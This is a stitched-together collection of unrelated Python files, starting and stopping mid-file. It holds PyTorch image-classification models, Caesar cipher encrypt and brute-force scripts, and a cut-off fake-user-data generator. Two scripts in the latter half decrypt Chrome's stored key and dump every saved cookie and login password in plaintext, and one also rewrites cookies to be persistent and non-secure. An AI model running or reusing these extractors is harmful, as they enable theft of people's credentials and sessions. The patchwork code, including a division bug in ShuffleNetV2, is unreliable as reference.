        return out


def DPN26():
    cfg = {
        'in_planes': (96, 192, 384, 768),
        'out_planes': (256, 512, 1024, 2048),
        'num_blocks': (2, 2, 2, 2),
        'dense_depth': (16, 32, 24, 128)
    }
    return DPN(cfg)


def DPN92():
    cfg = {
        'in_planes': (96, 192, 384, 768),
        'out_planes': (256, 512, 1024, 2048),
        'num_blocks': (3, 4, 20, 3),
        'dense_depth': (16, 32, 24, 128)
    }
    return DPN(cfg)


def test():
    net = DPN92()
    x = torch.randn(1, 3, 32, 32)
    y = net(x)
    print(y)


if __name__ == '__main__':
    test()


'''GoogLeNet with PyTorch.'''
import torch
import torch.nn as nn
import torch.nn.functional as F


class Inception(nn.Module):
    def __init__(self, in_planes, n1x1, n3x3red, n3x3, n5x5red, n5x5, pool_planes):
        super(Inception, self).__init__()
        # 1x1 conv branch
        self.b1 = nn.Sequential(
            nn.Conv2d(in_planes, n1x1, kernel_size=1),
            nn.BatchNorm2d(n1x1),
            nn.ReLU(True),
        )

        # 1x1 conv -> 3x3 conv branch
        self.b2 = nn.Sequential(
            nn.Conv2d(in_planes, n3x3red, kernel_size=1),
            nn.BatchNorm2d(n3x3red),
            nn.ReLU(True),
            nn.Conv2d(n3x3red, n3x3, kernel_size=3, padding=1),
            nn.BatchNorm2d(n3x3),
            nn.ReLU(True),
        )

        # 1x1 conv -> 5x5 conv branch
        self.b3 = nn.Sequential(
            nn.Conv2d(in_planes, n5x5red, kernel_size=1),
            nn.BatchNorm2d(n5x5red),
            nn.ReLU(True),
            nn.Conv2d(n5x5red, n5x5, kernel_size=3, padding=1),
            nn.BatchNorm2d(n5x5),
            nn.ReLU(True),
            nn.Conv2d(n5x5, n5x5, kernel_size=3, padding=1),
            nn.BatchNorm2d(n5x5),
            nn.ReLU(True),
        )

        # 3x3 pool -> 1x1 conv branch
        self.b4 = nn.Sequential(
            nn.MaxPool2d(3, stride=1, padding=1),
            nn.Conv2d(in_planes, pool_planes, kernel_size=1),
            nn.BatchNorm2d(pool_planes),
            nn.ReLU(True),
        )

    def forward(self, x):
        y1 = self.b1(x)
        y2 = self.b2(x)
        y3 = self.b3(x)
        y4 = self.b4(x)
        return torch.cat([y1,y2,y3,y4], 1)


class GoogLeNet(nn.Module):
    def __init__(self):
        super(GoogLeNet, self).__init__()
        self.pre_layers = nn.Sequential(
            nn.Conv2d(3, 192, kernel_size=3, padding=1),
            nn.BatchNorm2d(192),
            nn.ReLU(True),
        )

        self.a3 = Inception(192,  64,  96, 128, 16, 32, 32)
        self.b3 = Inception(256, 128, 128, 192, 32, 96, 64)

        self.maxpool = nn.MaxPool2d(3, stride=2, padding=1)

        self.a4 = Inception(480, 192,  96, 208, 16,  48,  64)
        self.b4 = Inception(512, 160, 112, 224, 24,  64,  64)
        self.c4 = Inception(512, 128, 128, 256, 24,  64,  64)
        self.d4 = Inception(512, 112, 144, 288, 32,  64,  64)
        self.e4 = Inception(528, 256, 160, 320, 32, 128, 128)

        self.a5 = Inception(832, 256, 160, 320, 32, 128, 128)
        self.b5 = Inception(832, 384, 192, 384, 48, 128, 128)

        self.avgpool = nn.AvgPool2d(8, stride=1)
        self.linear = nn.Linear(1024, 10)

    def forward(self, x):
        out = self.pre_layers(x)
        out = self.a3(out)
        out = self.b3(out)
        out = self.maxpool(out)
        out = self.a4(out)
        out = self.b4(out)
        out = self.c4(out)
        out = self.d4(out)
        out = self.e4(out)
        out = self.maxpool(out)
        out = self.a5(out)
        out = self.b5(out)
        out = self.avgpool(out)
        out = out.view(out.size(0), -1)
        out = self.linear(out)
        return out


def test():
    net = GoogLeNet()
    x = torch.randn(1,3,32,32)
    y = net(x)
    print(y.size())

if __name__ == '__main__':
    test()



'''MobileNet in PyTorch.

See the paper "MobileNets: Efficient Convolutional Neural Networks for Mobile Vision Applications"
for more details.
'''
import torch
import torch.nn as nn
import torch.nn.functional as F


class Block(nn.Module):
    '''Depthwise conv + Pointwise conv'''

    def __init__(self, in_planes, out_planes, stride=1):
        super(Block, self).__init__()
        self.conv1 = nn.Conv2d(
            in_planes,
            in_planes,
            kernel_size=3,
            stride=stride,
            padding=1,
            groups=in_planes,
            bias=False)
        self.bn1 = nn.BatchNorm2d(in_planes)
        self.conv2 = nn.Conv2d(
            in_planes,
            out_planes,
            kernel_size=1,
            stride=1,
            padding=0,
            bias=False)
        self.bn2 = nn.BatchNorm2d(out_planes)

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        out = F.relu(self.bn2(self.conv2(out)))
        return out


class MobileNet(nn.Module):
    # (128,2) means conv planes=128, conv stride=2, by default conv stride=1
    cfg = [
        64, (128, 2), 128, (256, 2), 256, (512, 2), 512, 512, 512, 512, 512,
        (1024, 2), 1024
    ]

    def __init__(self, num_classes=10):
        super(MobileNet, self).__init__()
        self.conv1 = nn.Conv2d(
            3, 32, kernel_size=3, stride=1, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(32)
        self.layers = self._make_layers(in_planes=32)
        self.linear = nn.Linear(1024, num_classes)

    def _make_layers(self, in_planes):
        layers = []
        for x in self.cfg:
            out_planes = x if isinstance(x, int) else x[0]
            stride = 1 if isinstance(x, int) else x[1]
            layers.append(Block(in_planes, out_planes, stride))
            in_planes = out_planes
        return nn.Sequential(*layers)

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        out = self.layers(out)
        out = F.avg_pool2d(out, 2)
        out = out.view(out.size(0), -1)
        out = self.linear(out)
        return out


def test():
    net = MobileNet()
    x = torch.randn(1, 3, 32, 32)
    y = net(x)
    print(y.size())


if __name__ == '__main__':
    test()



'''MobileNetV2 in PyTorch.

See the paper "Inverted Residuals and Linear Bottlenecks:
Mobile Networks for Classification, Detection and Segmentation" for more details.
'''
import torch
import torch.nn as nn
import torch.nn.functional as F


class Block(nn.Module):
    '''expand + depthwise + pointwise'''
    def __init__(self, in_planes, out_planes, expansion, stride):
        super(Block, self).__init__()
        self.stride = stride

        planes = expansion * in_planes
        self.conv1 = nn.Conv2d(in_planes, planes, kernel_size=1, stride=1, padding=0, bias=False)
        self.bn1 = nn.BatchNorm2d(planes)
        self.conv2 = nn.Conv2d(planes, planes, kernel_size=3, stride=stride, padding=1, groups=planes, bias=False)
        self.bn2 = nn.BatchNorm2d(planes)
        self.conv3 = nn.Conv2d(planes, out_planes, kernel_size=1, stride=1, padding=0, bias=False)
        self.bn3 = nn.BatchNorm2d(out_planes)

        self.shortcut = nn.Sequential()
        if stride == 1 and in_planes != out_planes:
            self.shortcut = nn.Sequential(
                nn.Conv2d(in_planes, out_planes, kernel_size=1, stride=1, padding=0, bias=False),
                nn.BatchNorm2d(out_planes),
            )

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        out = F.relu(self.bn2(self.conv2(out)))
        out = self.bn3(self.conv3(out))
        out = out + self.shortcut(x) if self.stride==1 else out
        return out


class MobileNetV2(nn.Module):
    # (expansion, out_planes, num_blocks, stride)
    cfg = [(1,  16, 1, 1),
           (6,  24, 2, 1),  # NOTE: change stride 2 -> 1 for CIFAR10
           (6,  32, 3, 2),
           (6,  64, 4, 2),
           (6,  96, 3, 1),
           (6, 160, 3, 2),
           (6, 320, 1, 1)]

    def __init__(self, num_classes=10):
        super(MobileNetV2, self).__init__()
        # NOTE: change conv1 stride 2 -> 1 for CIFAR10
        self.conv1 = nn.Conv2d(3, 32, kernel_size=3, stride=1, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(32)
        self.layers = self._make_layers(in_planes=32)
        self.conv2 = nn.Conv2d(320, 1280, kernel_size=1, stride=1, padding=0, bias=False)
        self.bn2 = nn.BatchNorm2d(1280)
        self.linear = nn.Linear(1280, num_classes)

    def _make_layers(self, in_planes):
        layers = []
        for expansion, out_planes, num_blocks, stride in self.cfg:
            strides = [stride] + [1]*(num_blocks-1)
            for stride in strides:
                layers.append(Block(in_planes, out_planes, expansion, stride))
                in_planes = out_planes
        return nn.Sequential(*layers)

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        out = self.layers(out)
        out = F.relu(self.bn2(self.conv2(out)))
        # NOTE: change pooling kernel_size 7 -> 4 for CIFAR10
        out = F.avg_pool2d(out, 4)
        out = out.view(out.size(0), -1)
        out = self.linear(out)
        return out


def test():
    net = MobileNetV2()
    x = torch.randn(2,3,32,32)
    y = net(x)
    print(y.size())

# test()


'''PNASNet in PyTorch.

Paper: Progressive Neural Architecture Search
'''
import torch
import torch.nn as nn
import torch.nn.functional as F


class SepConv(nn.Module):
    '''Separable Convolution.'''
    def __init__(self, in_planes, out_planes, kernel_size, stride):
        super(SepConv, self).__init__()
        self.conv1 = nn.Conv2d(in_planes, out_planes,
                               kernel_size, stride,
                               padding=(kernel_size-1)//2,
                               bias=False, groups=in_planes)
        self.bn1 = nn.BatchNorm2d(out_planes)

    def forward(self, x):
        return self.bn1(self.conv1(x))


class CellA(nn.Module):
    def __init__(self, in_planes, out_planes, stride=1):
        super(CellA, self).__init__()
        self.stride = stride
        self.sep_conv1 = SepConv(in_planes, out_planes, kernel_size=7, stride=stride)
        if stride==2:
            self.conv1 = nn.Conv2d(in_planes, out_planes, kernel_size=1, stride=1, padding=0, bias=False)
            self.bn1 = nn.BatchNorm2d(out_planes)

    def forward(self, x):
        y1 = self.sep_conv1(x)
        y2 = F.max_pool2d(x, kernel_size=3, stride=self.stride, padding=1)
        if self.stride==2:
            y2 = self.bn1(self.conv1(y2))
        return F.relu(y1+y2)

class CellB(nn.Module):
    def __init__(self, in_planes, out_planes, stride=1):
        super(CellB, self).__init__()
        self.stride = stride
        # Left branch
        self.sep_conv1 = SepConv(in_planes, out_planes, kernel_size=7, stride=stride)
        self.sep_conv2 = SepConv(in_planes, out_planes, kernel_size=3, stride=stride)
        # Right branch
        self.sep_conv3 = SepConv(in_planes, out_planes, kernel_size=5, stride=stride)
        if stride==2:
            self.conv1 = nn.Conv2d(in_planes, out_planes, kernel_size=1, stride=1, padding=0, bias=False)
            self.bn1 = nn.BatchNorm2d(out_planes)
        # Reduce channels
        self.conv2 = nn.Conv2d(2*out_planes, out_planes, kernel_size=1, stride=1, padding=0, bias=False)
        self.bn2 = nn.BatchNorm2d(out_planes)

    def forward(self, x):
        # Left branch
        y1 = self.sep_conv1(x)
        y2 = self.sep_conv2(x)
        # Right branch
        y3 = F.max_pool2d(x, kernel_size=3, stride=self.stride, padding=1)
        if self.stride==2:
            y3 = self.bn1(self.conv1(y3))
        y4 = self.sep_conv3(x)
        # Concat & reduce channels
        b1 = F.relu(y1+y2)
        b2 = F.relu(y3+y4)
        y = torch.cat([b1,b2], 1)
        return F.relu(self.bn2(self.conv2(y)))

class PNASNet(nn.Module):
    def __init__(self, cell_type, num_cells, num_planes):
        super(PNASNet, self).__init__()
        self.in_planes = num_planes
        self.cell_type = cell_type

        self.conv1 = nn.Conv2d(3, num_planes, kernel_size=3, stride=1, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(num_planes)

        self.layer1 = self._make_layer(num_planes, num_cells=6)
        self.layer2 = self._downsample(num_planes*2)
        self.layer3 = self._make_layer(num_planes*2, num_cells=6)
        self.layer4 = self._downsample(num_planes*4)
        self.layer5 = self._make_layer(num_planes*4, num_cells=6)

        self.linear = nn.Linear(num_planes*4, 10)

    def _make_layer(self, planes, num_cells):
        layers = []
        for _ in range(num_cells):
            layers.append(self.cell_type(self.in_planes, planes, stride=1))
            self.in_planes = planes
        return nn.Sequential(*layers)

    def _downsample(self, planes):
        layer = self.cell_type(self.in_planes, planes, stride=2)
        self.in_planes = planes
        return layer

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        out = self.layer1(out)
        out = self.layer2(out)
        out = self.layer3(out)
        out = self.layer4(out)
        out = self.layer5(out)
        out = F.avg_pool2d(out, 8)
        out = self.linear(out.view(out.size(0), -1))
        return out


def PNASNetA():
    return PNASNet(CellA, num_cells=6, num_planes=44)

def PNASNetB():
    return PNASNet(CellB, num_cells=6, num_planes=32)


def test():
    net = PNASNetB()
    x = torch.randn(1,3,32,32)
    y = net(x)
    print(y)

# test()


'''Pre-activation ResNet in PyTorch.

Reference:
[1] Kaiming He, Xiangyu Zhang, Shaoqing Ren, Jian Sun
    Identity Mappings in Deep Residual Networks. arXiv:1603.05027
'''
import torch
import torch.nn as nn
import torch.nn.functional as F


class PreActBlock(nn.Module):
    '''Pre-activation version of the BasicBlock.'''
    expansion = 1

    def __init__(self, in_planes, planes, stride=1):
        super(PreActBlock, self).__init__()
        self.bn1 = nn.BatchNorm2d(in_planes)
        self.conv1 = nn.Conv2d(
            in_planes,
            planes,
            kernel_size=3,
            stride=stride,
            padding=1,
            bias=False)
        self.bn2 = nn.BatchNorm2d(planes)
        self.conv2 = nn.Conv2d(
            planes, planes, kernel_size=3, stride=1, padding=1, bias=False)

        if stride != 1 or in_planes != self.expansion * planes:
            self.shortcut = nn.Sequential(
                nn.Conv2d(
                    in_planes,
                    self.expansion * planes,
                    kernel_size=1,
                    stride=stride,
                    bias=False))

    def forward(self, x):
        out = F.relu(self.bn1(x))
        shortcut = self.shortcut(out) if hasattr(self, 'shortcut') else x
        out = self.conv1(out)
        out = self.conv2(F.relu(self.bn2(out)))
        out += shortcut
        return out


class PreActBottleneck(nn.Module):
    '''Pre-activation version of the original Bottleneck module.'''
    expansion = 4

    def __init__(self, in_planes, planes, stride=1):
        super(PreActBottleneck, self).__init__()
        self.bn1 = nn.BatchNorm2d(in_planes)
        self.conv1 = nn.Conv2d(in_planes, planes, kernel_size=1, bias=False)
        self.bn2 = nn.BatchNorm2d(planes)
        self.conv2 = nn.Conv2d(
            planes,
            planes,
            kernel_size=3,
            stride=stride,
            padding=1,
            bias=False)
        self.bn3 = nn.BatchNorm2d(planes)
        self.conv3 = nn.Conv2d(
            planes, self.expansion * planes, kernel_size=1, bias=False)

        if stride != 1 or in_planes != self.expansion * planes:
            self.shortcut = nn.Sequential(
                nn.Conv2d(
                    in_planes,
                    self.expansion * planes,
                    kernel_size=1,
                    stride=stride,
                    bias=False))

    def forward(self, x):
        out = F.relu(self.bn1(x))
        shortcut = self.shortcut(out) if hasattr(self, 'shortcut') else x
        out = self.conv1(out)
        out = self.conv2(F.relu(self.bn2(out)))
        out = self.conv3(F.relu(self.bn3(out)))
        out += shortcut
        return out


class PreActResNet(nn.Module):
    def __init__(self, block, num_blocks, num_classes=10):
        super(PreActResNet, self).__init__()
        self.in_planes = 64

        self.conv1 = nn.Conv2d(
            3, 64, kernel_size=3, stride=1, padding=1, bias=False)
        self.layer1 = self._make_layer(block, 64, num_blocks[0], stride=1)
        self.layer2 = self._make_layer(block, 128, num_blocks[1], stride=2)
        self.layer3 = self._make_layer(block, 256, num_blocks[2], stride=2)
        self.layer4 = self._make_layer(block, 512, num_blocks[3], stride=2)
        self.linear = nn.Linear(512 * block.expansion, num_classes)

    def _make_layer(self, block, planes, num_blocks, stride):
        strides = [stride] + [1] * (num_blocks - 1)
        layers = []
        for stride in strides:
            layers.append(block(self.in_planes, planes, stride))
            self.in_planes = planes * block.expansion
        return nn.Sequential(*layers)

    def forward(self, x):
        out = self.conv1(x)
        out = self.layer1(out)
        out = self.layer2(out)
        out = self.layer3(out)
        out = self.layer4(out)
        out = F.avg_pool2d(out, 4)
        out = out.view(out.size(0), -1)
        out = self.linear(out)
        return out


def PreActResNet18():
    return PreActResNet(PreActBlock, [2, 2, 2, 2])


def PreActResNet34():
    return PreActResNet(PreActBlock, [3, 4, 6, 3])


def PreActResNet50():
    return PreActResNet(PreActBottleneck, [3, 4, 6, 3])


def PreActResNet101():
    return PreActResNet(PreActBottleneck, [3, 4, 23, 3])


def PreActResNet152():
    return PreActResNet(PreActBottleneck, [3, 8, 36, 3])


def test():
    net = PreActResNet18()
    y = net((torch.randn(1, 3, 32, 32)))
    print(y.size())


if __name__ == '__main__':
    test()



'''ShuffleNetV2 in PyTorch.

See the paper "ShuffleNet V2: Practical Guidelines for Efficient CNN Architecture Design" for more details.
'''
import torch
import torch.nn as nn
import torch.nn.functional as F


class ShuffleBlock(nn.Module):
    def __init__(self, groups=2):
        super(ShuffleBlock, self).__init__()
        self.groups = groups

    def forward(self, x):
        '''Channel shuffle: [N,C,H,W] -> [N,g,C/g,H,W] -> [N,C/g,g,H,w] -> [N,C,H,W]'''
        N, C, H, W = x.size()
        g = self.groups
        return x.view(N, g, C / g, H, W).permute(0, 2, 1, 3, 4).reshape(
            N, C, H, W)


class SplitBlock(nn.Module):
    def __init__(self, ratio):
        super(SplitBlock, self).__init__()
        self.ratio = ratio

    def forward(self, x):
        c = int(x.size(1) * self.ratio)
        return x[:, :c, :, :], x[:, c:, :, :]


class BasicBlock(nn.Module):
    def __init__(self, in_channels, split_ratio=0.5):
        super(BasicBlock, self).__init__()
        self.split = SplitBlock(split_ratio)
        in_channels = int(in_channels * split_ratio)
        self.conv1 = nn.Conv2d(
            in_channels, in_channels, kernel_size=1, bias=False)
        self.bn1 = nn.BatchNorm2d(in_channels)
        self.conv2 = nn.Conv2d(
            in_channels,
            in_channels,
            kernel_size=3,
            stride=1,
            padding=1,
            groups=in_channels,
            bias=False)
        self.bn2 = nn.BatchNorm2d(in_channels)
        self.conv3 = nn.Conv2d(
            in_channels, in_channels, kernel_size=1, bias=False)
        self.bn3 = nn.BatchNorm2d(in_channels)
        self.shuffle = ShuffleBlock()

    def forward(self, x):
        x1, x2 = self.split(x)
        out = F.relu(self.bn1(self.conv1(x2)))
        out = self.bn2(self.conv2(out))
        out = F.relu(self.bn3(self.conv3(out)))
        out = torch.cat([x1, out], 1)
        out = self.shuffle(out)
        return out


class DownBlock(nn.Module):
    def __init__(self, in_channels, out_channels):
        super(DownBlock, self).__init__()
        mid_channels = out_channels // 2
        # left
        self.conv1 = nn.Conv2d(
            in_channels,
            in_channels,
            kernel_size=3,
            stride=2,
            padding=1,
            groups=in_channels,
            bias=False)
        self.bn1 = nn.BatchNorm2d(in_channels)
        self.conv2 = nn.Conv2d(
            in_channels, mid_channels, kernel_size=1, bias=False)
        self.bn2 = nn.BatchNorm2d(mid_channels)
        # right
        self.conv3 = nn.Conv2d(
            in_channels, mid_channels, kernel_size=1, bias=False)
        self.bn3 = nn.BatchNorm2d(mid_channels)
        self.conv4 = nn.Conv2d(
            mid_channels,
            mid_channels,
            kernel_size=3,
            stride=2,
            padding=1,
            groups=mid_channels,
            bias=False)
        self.bn4 = nn.BatchNorm2d(mid_channels)
        self.conv5 = nn.Conv2d(
            mid_channels, mid_channels, kernel_size=1, bias=False)
        self.bn5 = nn.BatchNorm2d(mid_channels)

        self.shuffle = ShuffleBlock()

    def forward(self, x):
        # left
        out1 = self.bn1(self.conv1(x))
        out1 = F.relu(self.bn2(self.conv2(out1)))
        # right
        out2 = F.relu(self.bn3(self.conv3(x)))
        out2 = self.bn4(self.conv4(out2))
        out2 = F.relu(self.bn5(self.conv5(out2)))
        # concat
        out = torch.cat([out1, out2], 1)
        out = self.shuffle(out)
        return out


class ShuffleNetV2(nn.Module):
    def __init__(self, net_size):
        super(ShuffleNetV2, self).__init__()
        out_channels = configs[net_size]['out_channels']
        num_blocks = configs[net_size]['num_blocks']

        self.conv1 = nn.Conv2d(
            3, 24, kernel_size=3, stride=1, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(24)
        self.in_channels = 24
        self.layer1 = self._make_layer(out_channels[0], num_blocks[0])
        self.layer2 = self._make_layer(out_channels[1], num_blocks[1])
        self.layer3 = self._make_layer(out_channels[2], num_blocks[2])
        self.conv2 = nn.Conv2d(
            out_channels[2],
            out_channels[3],
            kernel_size=1,
            stride=1,
            padding=0,
            bias=False)
        self.bn2 = nn.BatchNorm2d(out_channels[3])
        self.linear = nn.Linear(out_channels[3], 10)

    def _make_layer(self, out_channels, num_blocks):
        layers = [DownBlock(self.in_channels, out_channels)]
        for i in range(num_blocks):
            layers.append(BasicBlock(out_channels))
            self.in_channels = out_channels
        return nn.Sequential(*layers)

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        # out = F.max_pool2d(out, 3, stride=2, padding=1)
        out = self.layer1(out)
        out = self.layer2(out)
        out = self.layer3(out)
        out = F.relu(self.bn2(self.conv2(out)))
        out = F.avg_pool2d(out, 4)
        out = out.view(out.size(0), -1)
        out = self.linear(out)
        return out


configs = {
    0.5: {
        'out_channels': (48, 96, 192, 1024),
        'num_blocks': (3, 7, 3)
    },
    1: {
        'out_channels': (116, 232, 464, 1024),
        'num_blocks': (3, 7, 3)
    },
    1.5: {
        'out_channels': (176, 352, 704, 1024),
        'num_blocks': (3, 7, 3)
    },
    2: {
        'out_channels': (224, 488, 976, 2048),
        'num_blocks': (3, 7, 3)
    }
}


def test():
    net = ShuffleNetV2(net_size=0.5)
    x = torch.randn(3, 3, 32, 32)
    y = net(x)
    print(y.shape)


if __name__ == '__main__':
    test()


import sys  # The sys module for system-related operations.
from colorama import Fore, init  # Import the colorama for colored text

init()  # Initialize the colorama library for colored text.


def implement_caesar_cipher(message, key, decrypt=False):
    # Initialize an empty string to store the result.
    result = ""
    # Iterate through each character in the user's input message.
    for character in message:
        # Check if the character is an alphabet letter.
        if character.isalpha():
            # Determine the shift amount based. i.e the amount of times to be shifted e.g 2,3,4....
            shift = key if not decrypt else -key
            # Check if the character is a lowercase letter.
            if character.islower():
                # Apply Caesar cipher transformation for lowercase letters.
                result += chr(((ord(character) - ord('a') + shift) % 26) + ord('a'))
            else:
                # Apply Caesar cipher transformation for uppercase letters.
                result += chr(((ord(character) - ord('A') + shift) % 26) + ord('A'))
        else:
            # Preserve non-alphabet characters as they are.
            result += character
    return result  # Return the encrypted or decrypted result.


# Prompt the user to enter the text to be encrypted
text_to_encrypt = input(f"{Fore.GREEN}[?] Please Enter your text/message: ")
# Prompt the user to specify the shift length (the key).
key = int(input(f"{Fore.GREEN}[?] Please specify the shift length: "))


# Check if the specified key is within a valid range (0 to 25).
if key > 25 or key < 0:
    # Display an error message if the key is out of range.
    print(f"{Fore.RED}[!] Your shift length should be between 0 and 25 ")
    sys.exit()  # Exit the program if the key is invalid.

# Encrypt the user's input using the specified key.
encrypted_text = implement_caesar_cipher(text_to_encrypt, key)

# Display the encrypted text.
print(f"{Fore.GREEN}[+] {text_to_encrypt} {Fore.MAGENTA}has been encrypted as {Fore.RED}{encrypted_text}")



# Import colorama for colorful text.
from colorama import Fore, init

init()


# Define a function for Caesar cipher encryption.
def implement_caesar_cipher(text, key, decrypt=False):
    # Initialize an empty string to store the result.
    result = ""

    # Iterate through each character in the input text.
    for char in text:
        # Check if the character is alphabetical.
        if char.isalpha():
            # Determine the shift value using the provided key (or its negation for decryption).
            shift = key if not decrypt else -key

            # Check if the character is lowercase
            if char.islower():
                # Apply the Caesar cipher encryption/decryption formula for lowercase letters.
                result += chr(((ord(char) - ord('a') + shift) % 26) + ord('a'))
            else:
                # Apply the Caesar cipher encryption/decryption formula for uppercase letters.
                result += chr(((ord(char) - ord('A') + shift) % 26) + ord('A'))
        else:
            # If the character is not alphabetical, keep it as is e.g. numbers, punctuation
            result += char

    # Return the result, which is the encrypted or decrypted text
    return result


# Define a function for cracking the Caesar cipher.
def crack_caesar_cipher(ciphertext):
    # Iterate through all possible keys (0 to 25) as there 26 alphabets.
    for key in range(26):
        # Call the caesar_cipher function with the current key to decrypt the text.
        decrypted_text = implement_caesar_cipher(ciphertext, key, decrypt=True)

        # Print the result, showing the decrypted text for each key
        print(f"{Fore.RED}Key {key}: {decrypted_text}")


# Initiate a continuous loop so the program keeps running.
while True:
    # Accept user input.
    encrypted_text = input(f"{Fore.GREEN}[?] Please Enter the text/message to decrypt: ")
    # Check if user does not specify anything.
    if not encrypted_text:
        print(f"{Fore.RED}[-] Please specify the text to decrypt.")
    else:
        crack_caesar_cipher(encrypted_text)


import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove 'DPAPI' str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main():
    # local sqlite Chrome cookie database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
        print(f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================""")
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()


import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)

    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


# Import necessary libraries and modules.
from faker import Faker
from faker.providers import internet
import csv


# Function to generate user data with the specified number of users.
def generate_user_data(num_of_users):
    # Create a Faker instance.
    fake = Faker()
    # Add the Internet provider to generate email addresses and IP addresses.
    fake.add_provider(internet)

    # Initialize an empty list to store user data.
    user_data = []
    # Loop to generate data for the specified number of users.
    for _ in range(num_of_users):
        # Create a dictionary representing a user with various attributes.
        user = {
            'Name': fake.name(),
